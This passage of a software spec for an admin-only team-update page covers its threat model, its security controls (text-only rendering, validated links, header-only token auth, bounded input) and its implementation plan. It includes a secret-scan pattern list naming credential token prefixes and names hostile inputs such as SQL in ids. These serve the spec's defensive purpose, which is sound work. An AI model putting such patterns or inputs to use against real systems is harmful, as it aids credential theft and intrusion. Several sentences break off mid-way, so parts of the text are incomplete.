   and GitHub tokens.
7. **Unauthenticated or cross-site writes (E4).** An endpoint that forgets `isAdmin` on one
   method (say `POST` checked, `GET` not, or a new `DELETE`), accepts the token from a cookie
   or a query string, or sends permissive CORS headers. With the token in a header and no
   CORS, a cross-site page cannot make an authenticated request: a form post cannot set
   `Authorization`, and a `fetch` with that header needs a preflight the API never grants.
   CSRF is therefore not applicable **as long as** none of those three things is ever added.
   The impact of a forged write is small (Steven's notifications cleared or restored, hiding
   a change to his own team), but it is exactly the signal this feature exists to carry.
8. **Malformed input to the API (E4).** Non-hex or upper-case ids, ids of other lengths, SQL
   in an id, a 10 MB body, 100 000 ids, unknown actions, invalid JSON, `__proto__` keys.
   Without limits: D1 row bloat, a slow request, a 500 that echoes the input.
9. **Read state abused across previews (E5).** Preview deployments share the production D1
   and the same `ADMIN_TOKEN`, so opening a branch preview's Team page marks ids read in
   production. Ids are commit SHAs, so a preview can only touch ids for commits it lists;
   marking a branch-only commit read is harmless. Accepted, no control beyond the token.
10. **The team data reaching recruiters (E2 to the public surfaces).** The manifest is imported
    by a shared module, or emitted as a public JSON file, and the assistant
    (`functions/_lib/ask/`), WebMCP (`src/webmcp.ts`, registered on every public page), the
    public `/mcp`, `read_site_page` or the prerendered Markdown and `llms*.txt` pick it up. The
    assistant then answers "who is on Steven's team?" with six agents (the recruiter's blocker:
    a fact about Steven without a source). Likelihood: medium through an innocent shared
    import. Impact: a reader misled about Steven's team size.

### Required controls

**C1. The manifest is an allowlist of public repository content (abuse 1).**
- The generator reads only the paths in its orchestration list, resolved through git from the
  built commit (`git show <sha>:<path>`, `git ls-tree`), never by walking the working tree, so
  ignored and untracked files (`.review/`, `sources/`, `.dev.vars`, `.wrangler/`) cannot be
  read even when they exist on the runner. Paths matching `.review/`, `sources/`, `.env*`,
  `.dev.vars*` are rejected even if someone adds them to the list.
- Each update carries exactly: full SHA, committer date (ISO), summary (one line), PR number
  (integer or null), touched section ids, touched flow-step ids. No author name or e-mail, no
  commit body beyond the one PR-title line, no diff text.
- Each section carries only the fields AC-2 names (frontmatter `name`, `description`, `##`
  headings, team.md table and steps, `review.yml` job keys and `name:`). No other frontmatter
  key, so a `tools:` or future `secrets:`-like key never ships.
- A secret scan on the generated manifest fails the build's test when it matches a token
  pattern (`sk-ant-`, `ghp_`, `gho_`, `github_pat_`, `AKIA`, `-----BEGIN`, 32+ hex or base64
  runs outside the `sha` fields) or an e-mail address.
- No D1 data, no API response and no environment variable is read by the generator.

**C2. Untrusted text is rendered as text only (abuse 2 and 3).**
- Every manifest string reaches the DOM as a React text child. No `dangerouslySetInnerHTML`,
  no Markdown or HTML renderer, no manifest string in an `href`, `src`, `style`, `className`,
  `id` or `data-*` attribute. The `data-part` labels and section ids come from the component's
  own constants or from slugs the generator makes with `[a-z0-9-]` only.
- The generator normalises every string: strips C0/C1 control characters, bidi overrides and
  isolates (U+202A to U+202E, U+2066 to U+2069), zero-width characters (U+200B to U+200D,
  U+FEFF); collapses whitespace and newlines to one space.
- Length caps at generation: summary 300 characters, description 1 000, heading 120, step
  text 1 000; cut on a code-point boundary (`Array.from`), with `…`.
- CSP stays as it is (`script-src 'self'` plus hashes); the Team page adds no inline script and
  no new origin to `connect-src`.

**C3. Links are built, never taken from text (abuse 4).**
- Every GitHub link is a constant `https://github.com/<owner>/<repo>` plus a validated part:
  `/commit/<sha>` with `^[0-9a-f]{40}$`, `/pull/<n>` with `n` a positive integer below
  `1e7`, `/blob/<sha>/<path>` with the path taken from the generator's own list (each segment
  `encodeURIComponent`d). Anything that fails validation renders as text without a link.
- External links open with `target="_blank" rel="noopener noreferrer"`.

**C4. Bounded generator (abuse 5 and 6).**
- At most 200 updates in the manifest (the rest are summarised as "and N older changes" with a
  link to the file history on GitHub); manifest JSON at most 256 KB, else the oldest updates are
  dropped and the page says so.
- Git is called with `execFileSync('git', [args])` (no shell), refs and paths passed as
  separate arguments after `--`; the built SHA comes from `git rev-parse HEAD` and is validated
  as 40 hex.
- A file that cannot be parsed yields a `{ error: 'unreadable', path }` part (AC-5); a git
  failure (shallow clone, no git) yields `history: null` (AC-7). Neither throws.

**C5. The read-state API (abuse 7 and 8).**
- `isAdmin(request, env)` is the first statement of every handler the file exports (`GET` and
  `POST`, and any method added later); it answers 401 before reading the body or touching D1.
  No `onRequest` catch-all, so other methods get 405 from Pages.
- The token is accepted only from the `Authorization` header (the existing `isAdmin`); never
  from a cookie, query string or body. No `Access-Control-*` header on this route. No `Set-Cookie`.
- `POST` requires `Content-Type: application/json` (415 otherwise), which rules out the
  CORS-safe form encodings; body at most 16 KB (check `Content-Length` and the bytes actually
  read; 413).
- Body schema, checked by hand or with a small validator, everything else 400 with a fixed
  message that echoes nothing: `{ "action": "read" | "unread" | "readAll", "ids": string[] }`;
  `ids` 1 to 200 entries (`readAll` sends the ids the page lists; the server never invents
  them), each `^[0-9a-f]{40}$`, de-duplicated. Unknown top-level keys are 400.
- SQL is fixed text with bound parameters only; writes in one `DB.batch`. Amended at
  reconciliation (the developer's storage, needed because decision 1 makes old updates read
  by default, so unread must be storable): every action is an upsert
  `INSERT INTO team_reads (id, read, at) VALUES (?, ?, ?) ON CONFLICT(id) DO UPDATE ...`;
  `read` / `readAll` set `read = 1` and keep the first read time (`DO UPDATE ... WHERE
  team_reads.read = 0`), `unread` sets `read = 0`. No `DELETE`. All idempotent: repeating a
  request leaves the same state and returns the same 200 body.
- `GET` returns `{ read: string[], unread: string[] }` (rows with `read = 1` / `0`), at most
  the newest 1 000 rows by `at`; `POST` answers with the same body; `Cache-Control: no-store`
  on every answer, errors included. A D1 error (table missing before the migration is applied)
  is a 500 with `{ "error": "unavailable" }` and a `console.error` that does not log headers;
  the page then follows AC-15.
- No rate limit beyond the token (same as the other admin endpoints); the token's own
  brute-force exposure is unchanged by this feature.

**C6. The migration (E5).**
- One additive file, `migrations/0011_team_reads.sql`: `CREATE TABLE IF NOT EXISTS
  team_reads (id TEXT PRIMARY KEY CHECK (length(id) = 40 AND id NOT GLOB '*[^0-9a-f]*'), read
  INTEGER NOT NULL CHECK (read IN (0, 1)), at INTEGER NOT NULL)` (amended at reconciliation
  from `read_at` only). The same statement runs on first use (`ensure()`, as
  `resume-scores.ts`) in case the migration was not applied. No change to existing tables, no
  personal data, no visitor data.
- AC-14 (older updates start read) is done in the generator and the page: the generator's
  computed `launch` (the oldest first-parent commit adding `scripts/team-manifest.mjs`) marks
  older updates `beforeLaunch: true`; no SHA constant, no seeding endpoint, no D1 credentials
  in the build.

**C7. The Needs you line and tile (abuse 2 and 3).**
- `needs.ts` builds the line from the normalised summary, cut at 80 code points (`Array.from`,
  never `slice` on UTF-16) plus `…`, and the overview renders `need.text` as a text child, as
  it does today. The count and the date come from numbers and the date field, not from text.

**C8. The manifest stays in the admin (abuse 10).**
- The manifest is a build-time virtual module or a generated file imported only from
  `src/admin/`; it is not emitted as a public `.json` asset and has no route.
- No file in `functions/`, `src/webmcp.ts`, `src/ask/`, `src/articles/`, `src/resume.ts`,
  `src/pageMeta.ts` or any module shared by the `main` entry imports it. The new API serves
  read ids only, never manifest content, and no MCP tool (public or private) or assistant tool
  calls it in this change.

## Technical approach (senior-developer)

Feasible as specified, with no new dependency. The contradiction this section raised (AC-9
against the design's seen rule) is settled by Steven's decision 4, and the chart the diagram

- **Where it runs.** Inside `vite build`, not as a separate step: a small plugin in
  `vite.config.ts` resolves the id `virtual:team-manifest` and its `load` hook returns
  `export default <JSON>` from `generate()`. Only `src/admin/` imports that id, so Rollup puts
  it in the `admin` entry's chunk; the `main` entry and the SSR build (`--ssr
  src/entry-server.tsx`) never load it, so the generator does not run there. No file is
  written to `dist/` and nothing is committed (AC-4: it cannot lag the files). `tsc -b` needs
  only `src/admin/team-manifest.d.ts`: `declare module 'virtual:team-manifest'` with the
  `TeamManifest` type. `npm run dev` gets the same plugin. Vitest has its own config: an alias
  in `vitest.config.ts` maps `virtual:team-manifest` to `src/test/team-manifest.fixture.ts`

  and `dist/building-aibreaker.md` today (the AI Breaker write-up), so they cannot serve as
  the "no manifest string" probe of AC-18.
- **Never fails the build** (the recruiter's nit, AC-5). `generate()` never throws: each part
  is parsed in its own `try`, a failure becomes `{ path, error: 'unreadable', message }` in
  `manifest.problems` and an `{ unreadable: path }` placeholder in that section; the plugin
  wraps the whole call once more and, on anything unexpected, returns
  `{ schema, commit: null, sections: [], flow: null, history: null, problems: [...] }`. Each
  problem is printed with `this.warn()` so it shows in the Actions log. The AC-4 test (below)
  fails on any problem, so CI stops a malformed file before merge while a deploy never does.
- **Inputs.** One exported list, `ORCHESTRATION`, the only place the files are named:
  `{ glob, section }` for `.claude/team.md` (flow, roles, gates), `.claude/agents/*.md`
  (roles), `.claude/skills/*/SKILL.md` (commands), `.github/workflows/review.yml` (gates),
  `.github/workflows/site-update.yml` (siteUpdate, with `steps: ['Let Claude make the

  `--`), from the built commit (`git show <sha>:<path>`, `git ls-tree -r --name-only <sha>`),
  never from the working tree, per the threat model's C1; the built SHA is
  `git rev-parse HEAD`, checked against `^[0-9a-f]{40}$`. No YAML or Markdown library: the
  frontmatter is `---`-delimited `key: value` lines (quoted values unquoted), Markdown is
  split on `^## ` and `^\d+\. ` lines, YAML is cut by indentation (below).

- **Flow and diagram** (AC-20). Steps are the numbered items under `## The flow` in
  `team.md`: `n`, `title` (the leading `**…**`), `text` (normalised), `who` (the parenthetical
  right after the title, e.g. `(lead)`), `people` (backticked agent names in the item that
  are agent files, in order, plus `lead`), `checks` (backticked words that are job keys in
  `review.yml` or `site-check.yml`). The diagram's structure comes from the ` ```mermaid `
  flowchart under the same heading, which `review-team` added and GitHub renders; it is the
  one machine-readable source (no second copy). The generator reads a small fixed subset,
  no Mermaid package: `flowchart TD|LR`; node definitions `id[...]`, `id([...])`, `id{...}`
  (label = the bracket text); `subgraph id [label]` ... `end` (members = the nodes defined
  inside; edges inside a subgraph only describe its members); edges `-->`, `---`, `-.->`,
  `-.-`, with a label as `-- label -->` or `-.label.-`; chains (`a --> b --> c`) and `&`;
  `class a,b you` / `class a,b gate`; and `%% step N: id` comment lines. Anything else on a
  line is ignored. The order of the nodes is their first appearance outside a subgraph's
  inside; an edge to a node already placed is a loop (`loop: { to, label }`), an edge with a
  label out of a `{}` node is a decision branch. It returns per node: `id`, `label`,
  `shape`, `members`, `steps` (numbers), `lane` (`you` when classed `you`, else `team`),
  `gate`, `next` (with labels) and `loop`. Validation (each failure a `problems` entry, and
  `flow.diagram: null` so the page lists the steps instead): every numbered step has exactly
  one `%% step` line; every `%% step` line names an existing node and an existing step
  number; every `class` line names existing nodes; the chart has at least one node. Nodes
  with no step (today `steven1`, `deploy`) are drawn without a number.

- **Git history** (AC-6, AC-7, AC-14). `git rev-parse --is-shallow-repository`; `true`, a
  non-repository or any git error gives `history: null` (the page says "The history of
  changes is not in this build", nothing in Needs you). Otherwise one call:
  `git log --first-parent --name-only -z --format=%H%x1f%P%x1f%cI%x1f%s%x1f%b%x1e HEAD`
  (with `--first-parent`, git 2.31+ diffs merges against the first parent only; the runners
  have 2.4x, Steven's machine 2.55). First-parent means a merge of `main` into a branch is
  never walked into, as AC-6 asks; on a branch build, a "Merge (remote-tracking )?branch
  '?(origin/)?main'? into …" commit on the branch itself is skipped too. Paths are matched to
  `ORCHESTRATION` in JS (no pathspec, so every commit is seen once); a commit touching none is
  dropped. The root commit (no parent) diffs against the empty tree. 93 first-parent commits
  today; at most 200 updates kept (C4).
- **What an update touched.** Per path: an agent file -> `roles` + that agent; a skill ->
  `commands` + that skill; `review.yml` -> `gates` + the jobs whose text block differs, and
  the flow steps that backtick a changed job key; gate scripts and `functions/_lib/review/`
  -> `gates`; `specs/TEMPLATE.md` -> `flow`. For `team.md` and `site-update.yml` the
  generator compares the old and new text, `git show <sha>^1:<path>` against
  `git show <sha>:<path>` (missing on one side = added or removed):
  - `team.md` split on `^## `: the part before `## The flow` -> `roles`, `## The flow` ->
    `flow`, `## The verdict block` -> `gates`, anything else -> `flow`. Inside the flow, steps
    are matched by title: a step whose text (number stripped) or chart node (label, members,
    class, edges, via its `%% step` line) differs, or whose title is new, is a changed step; a title that disappeared is listed in
    `removedSteps` (the design's "Removed: …" line). Matching by title keeps an inserted step
    from marking every later step as changed.
  - `site-update.yml` (Steven's decision 2): the generator cuts out each step named in the
    list, from its `- name: <name>` line to the next line indented at or left of that dash,
    so the `prompt: |` block and `claude_args` are inside it; it compares the two cut-outs
    (the text after trimming trailing spaces; the sha256 of it is what gets compared and is
    kept on the update for debugging). Equal on both sides: the file's change is ignored (an
    e-mail or refresh step changed). A step present on one side only counts as changed. If no
    named step exists in the **current** file (it was renamed), every change to the file
    counts and is a `problems` entry, so the AC-5 test fails and a rename cannot silently
    hide team changes. A counted change touches the `siteUpdate` section.
  - An update whose touched list ends empty is not an update.
- **Summary** (AC-6): the subject; when it matches `^Merge pull request #(\d+) from `, the
  first non-empty body line (the PR title) and `pr: N`; when it matches the local style
  `^Merge [^\s:]+: (.+)` (as `git log` shows on main), the text after the colon with its first
  letter capitalised. Never the rest of the body (C1).
- **Go-live, everything before it read** (Steven's decision 1, AC-14). `launch` is the oldest
  first-parent commit that adds `scripts/team-manifest.mjs`
  (`git log --first-parent --diff-filter=A --reverse --format=%H -- scripts/team-manifest.mjs`,

  `.claude/agents/product-manager.md` and `team.md` (AC-16), so it is the first unread update.

  access (C6). On a branch preview, `launch` is the branch's own commit that added the file.

### The read state: migration, API, store

- `migrations/0011_team_reads.sql` (next after `0010_ask_questions_resolution.sql`; checked on
  main too): `CREATE TABLE IF NOT EXISTS team_reads (id TEXT PRIMARY KEY CHECK (length(id) = 40
  AND id NOT GLOB '*[^0-9a-f]*'), read INTEGER NOT NULL CHECK (read IN (0, 1)), at INTEGER NOT
  NULL)`. A `read` column rather than "row means read" (the threat model's C5/C6 draft, now
  amended to this),
  because Steven's decision 1 makes old updates read by default, and **Mark as unread** on one
  of them must be storable: unread is an upsert with `read = 0`, not a delete. Still
  idempotent. Deploys do not apply migrations (README: `npm run db:migrate` before
  deploying), so `functions/_lib/team-reads.ts` also creates the table on first use, exactly
  as `resume-scores.ts` does (`ensure()`).
- `functions/api/team.ts`, the pattern of `functions/api/resume.ts` and `stats.ts`:
  - `onRequestGet`: `isAdmin` first, else 401; returns `{ read: string[], unread: string[] }`
    (rows with `read = 1` / `0`, newest 1 000 by `at`), `Cache-Control: no-store`.
  - `onRequestPost`: `isAdmin` first; then C5's checks (JSON content type, 16 KB, schema
    `{ action: 'read' | 'unread' | 'readAll', ids }`, 1 to 200 ids of 40 lower-case hex,
    deduplicated); one `DB.batch` of `INSERT INTO team_reads (id, read, at) VALUES (?, ?, ?)
    ON CONFLICT(id) DO UPDATE SET read = excluded.read, at = excluded.at` (for `read`, `DO
    UPDATE ... WHERE team_reads.read = 0` so the first read time stays); `readAll` is `read`
    over the ids the page lists. Answers with the same body as GET, so the page needs no
    second request. D1 failure: 500 `{ error: 'unavailable' }`.
  - No `onRequest`, so other methods get 405; no CORS headers; token only from the header.
- Previews share the production D1 (threat model abuse 9): reads from a preview count in
  production. Ids are SHAs, so that is harmless.

### Edge cases (each a named test above or below)

- **Shallow clone** (`--depth 1`) and **no git at all**: sections build, `history: null`,
  the page says so, no need (AC-7).
- **First run**: an empty `team_reads` table; every update before `launch` is read, `launch`
  and later are unread (AC-14). The `launch` commit missing from a shallow history: nothing
  counts as unread.
- **Site update changes outside the team step** do not count; a change in both counts once
  (AC-6 Site update rule).
- **Fake timers and visibility**: `setTimeout`, `clearTimeout` and `Date` faked (the
  existing `Admin.test.tsx` fakes only `Date` and `setInterval`; the Team tests add
  `setTimeout`), `document.visibilityState` spied and `visibilitychange` dispatched;
  `vi.useRealTimers()` and `vi.restoreAllMocks()` in `afterEach`.
- **A seen call failing** (fetch rejects, or 500): no banner; the head shows `Could not
  record that you have seen this; it will be tried again on your next visit.`; markers,
  badge and need stay; no Undo shown; the next mount posts again (AC-15 row). On the server:
  `db.failOn = /team_reads/` gives 500 with no partial write reported as success
  (`team.test.ts` "a failing D1 write answers 500").
- **Undo failing**: the rows stay read and the head says so; no silent state flip.
- **Two tabs**: a `readAll` for ids already read is idempotent (`team.test.ts` "marking an
  id read twice keeps one row and the first time").
- **An update id in D1 that is no longer in the manifest** (history rewritten): ignored in
  counts (`team-state.test.ts`).
- **Long content**: an 81-character line is cut to 80 + `…` in Needs you only; never on
  the page.
- **Merge subject without a PR title in the body**: falls back to the subject (AC-6 row).

### The bar

`npm run test:coverage` at 90% or more of statements, branches, functions and lines,
overall and for every new or changed file on its own (`perFile` in `vitest.config.ts`).
The generator is a build script under `scripts/`: `scripts/team-manifest.mjs` is added to
`coverage.include` in `vitest.config.ts` like `scripts/resume-gate.mjs`, so it is measured;
leaving it out is a `blocker`. No new exclusion. Every test asserts what Steven sees or what
a caller gets; no snapshot tests; no network (the generator's git runs on a temp repository;
the page's fetch is stubbed).
